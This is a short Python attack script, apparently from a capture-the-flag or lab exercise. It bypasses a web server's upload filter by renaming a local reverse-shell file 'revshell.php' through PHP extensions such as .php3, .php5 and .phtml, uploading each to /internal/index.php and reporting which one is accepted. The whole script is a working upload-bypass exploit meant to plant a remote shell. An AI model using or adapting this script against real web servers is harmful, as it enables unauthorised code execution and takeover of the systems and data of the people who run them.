#!/usr/bin/env python3
import requests
import sys
import os

# if (len(sys.argv) < 2) or (len(sys.argv) > 2):
#     print("Usage: " +sys.argv[0]+ " <ip:port>")
#     sys.exit(1)

# if ":" not in sys.argv[1]:
# 	print("Please Provide a Port number.\n")
# 	sys.exit(1)

url = f"http://{sys.argv[1]}/internal/index.php"

filename = "revshell"
old_filename = "revshell.php"
extensions = [".php",".php3",".php4",".php5",".phtml"]

new_filename = filename + extensions[0]

for ext in extensions:
	new_filename = filename + ext
	os.rename(old_filename, new_filename)

	files = {"file" : open(new_filename, "rb")}
	r = requests.post(url, files=files)

	if "Extension not allowed" not in r.text:
		print(f"{ext} is allowed")
		# os.rename(new_filename, filename+".php")
		sys.exit(1)

	old_filename = new_filename
